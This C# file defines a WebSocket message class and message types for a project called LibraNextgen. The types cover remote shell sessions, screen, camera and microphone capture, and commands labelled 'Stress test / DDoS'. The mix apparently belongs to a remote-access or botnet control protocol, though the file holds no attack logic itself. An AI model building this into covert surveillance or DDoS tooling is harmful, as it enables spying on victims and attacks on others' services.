using System.Text.Json;
using System.Text.Json.Serialization;

namespace LibraNextgen.Common.Protocol;

public class WebSocketMessage
{
    [JsonPropertyName("type")]
    public string Type { get; set; } = string.Empty;

    [JsonPropertyName("channel")]
    public string Channel { get; set; } = string.Empty;

    [JsonPropertyName("data")]
    public JsonElement? Data { get; set; }

    [JsonPropertyName("ts")]
    public long Timestamp { get; set; } = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

    [JsonPropertyName("rid")]
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? RequestId { get; set; }

    public string ToJson()
    {
        return JsonSerializer.Serialize(this, WsJsonContext.Default.WebSocketMessage);
    }

    public static WebSocketMessage? FromJson(string json)
    {
        return JsonSerializer.Deserialize(json, WsJsonContext.Default.WebSocketMessage);
    }
}

/// <summary>
/// Predefined WebSocket message types.
/// </summary>
public static class WsMessageType
{
    public const string AgentOnline = "agent.online";
    public const string AgentOffline = "agent.offline";
    public const string TaskCreated = "task.created";
    public const string TaskUpdated = "task.updated";
    public const string ShellInput = "shell.input";
    public const string ShellOutput = "shell.output";
    public const string ShellLockAcquired = "shell.lock.acquired";
    public const string ShellLockReleased = "shell.lock.released";
    public const string ShellObserverJoined = "shell.observer.joined";

    public const string ScreenBind = "screen.bind";
    public const string ScreenUnbind = "screen.unbind";
    public const string ScreenConfig = "screen.config";
    public const string ScreenFrame = "screen.frame";
    public const string ScreenDiff = "screen.diff";
    public const string ScreenError = "screen.error";

    public const string CameraBind = "camera.bind";
    public const string CameraUnbind = "camera.unbind";
    public const string CameraConfig = "camera.config";
    public const string CameraFrame = "camera.frame";
    public const string CameraError = "camera.error";

    public const string MicBind = "mic.bind";
    public const string MicUnbind = "mic.unbind";
    public const string MicData = "mic.data";
    public const string MicError = "mic.error";

    // Stress test / DDoS
    public const string StressStart = "stress.start";
    public const string StressStop = "stress.stop";
    public const string StressStatus = "stress.status";
    public const string StressUpdate = "stress.update";
}

[JsonSerializable(typeof(WebSocketMessage))]
internal partial class WsJsonContext : JsonSerializerContext
{
}
